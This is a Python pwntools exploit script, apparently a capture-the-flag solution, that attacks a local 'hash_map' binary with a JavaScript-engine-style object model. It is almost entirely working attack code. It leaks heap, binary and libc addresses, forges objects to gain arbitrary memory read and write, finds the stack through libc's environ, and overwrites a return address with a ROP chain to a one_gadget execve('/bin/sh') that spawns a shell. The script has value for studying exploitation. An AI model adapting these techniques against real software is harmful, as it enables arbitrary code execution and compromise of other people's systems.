from pwn import *
context.log_level = 'info'

elf = ELF('./bin/hash_map')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = elf.process(env={'LD_PRELOAD': libc.path})

def send(data):
    p.recvuntil('Command > '.encode())
    p.sendline(data.encode())
    return p.recvline()[9:-1].decode()


######################################
### Stage 1: Trigger Out-of-Memory ###
######################################

send('create hash_map')

# Trigger OOM
for i in range(0, 0x200):
    send(f'hash_map set {i} {i}')


######################################
### Stage 2: Custom Heap Addr Leak ###
######################################

send('create object_array')  # 0
send('create object_array')  # 1
send('create object')        # 2
send('create object')        # 3
send('create integer_array') # 4

send('object 0 set item 3 2')
send('object 0 set item 4 4')

leak_addr = int(send('hash_map get 1910918072')) # IntegerArray address
base_addr = leak_addr & 0xffffffff00000000
obj_addr = base_addr + 0xa000

print()
log.info(f'base_addr @ {base_addr:#x}')
log.info(f'leak_addr @ {leak_addr:#x}')
log.info(f'obj_addr @ {obj_addr:#x}')
print()


################################
### Stage 3: AddrOf, FakeObj ###
################################

send(f'object 0 set property 0 {leak_addr - 0x30}')
send(f'object 1 set property 1 {0x13371337}')
send(f'object 1 set property 0 {leak_addr}')
send('hash_map delete 762944675')


###########################
### Stage 4: PIE Bypass ###
###########################

send(f'object 2 set property 3 {0x13371337}')
send(f'object 0 set property 0 {obj_addr + 0x10}')

obj_vtable = int(send('hash_map get 762944675'))
binary_base = obj_vtable - 0x15a90
int_arr_vtable = binary_base + 0x15ab8

log.info(f'binary_base @ {binary_base:#x}')
log.info(f'Object\'s vtable @ {obj_vtable:#x}')
log.info(f'IntegerArray\'s vtable @ {int_arr_vtable:#x}')
print()


######################
### Stage 5: AAR/W ###
######################

send(f'object 2 set property 0 {int_arr_vtable}') # vtable
send(f'object 4 set item 0 {obj_addr + 0x10}')

def aar(addr):
    send(f'object 2 set property 1 {addr}') # butterfly
    p.recvuntil('Command > '.encode())
    p.sendline(f'object 1 get item 0'.encode())
    p.recvuntil('    IntegerArray > '.encode())
    p.sendline(f'get item 0'.encode())
    return int(p.recvline()[9:-1].decode())

def aaw(addr, value):
    send(f'object 2 set property 1 {addr}') # butterfly
    p.recvuntil('Command > '.encode())
    p.sendline(f'object 1 get item 0'.encode())
    p.recvuntil('    IntegerArray > '.encode())
    p.sendline(f'set item 0 {value}'.encode())
    p.recvline()

binary_puts_got = binary_base + elf.got['puts']

libc_puts = aar(binary_puts_got)
libc_base = libc_puts - libc.sym['puts']

log.info(f'binary_puts_got @ {binary_puts_got:#x}')
log.info(f'libc_base @ {libc_base:#x}')
log.info(f'libc_puts @ {libc_puts:#x}')
print()

libc_environ = libc_base + libc.sym['environ']
binary_stack = aar(libc_environ)

log.info(f'binary_stack @ {binary_stack:#x}')

ret_addr = binary_stack - 0x120

libc_ppr = libc_base + 0x11f2e7    # pop rdx ; pop r12 ; ret
libc_pr = libc_base + 0x2be51      # pop rsi ; ret
libc_oneshot = libc_base + 0xebc88
"""
0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
"""

log.info(f'libc_oneshot @ {libc_oneshot:#x}')
log.info(f'ret_addr @ {ret_addr:#x}')
print()

aaw(ret_addr - 0x8, obj_addr)      # valid address
aaw(ret_addr, libc_ppr)
aaw(ret_addr + 0x8, 0x0)
aaw(ret_addr + 0x10, 0x0)
aaw(ret_addr + 0x18, libc_pr)
aaw(ret_addr + 0x20, 0x0)
aaw(ret_addr + 0x28, libc_oneshot)

p.recvuntil('Command > '.encode())
p.sendline(f'quit'.encode())

p.interactive()
p.close()
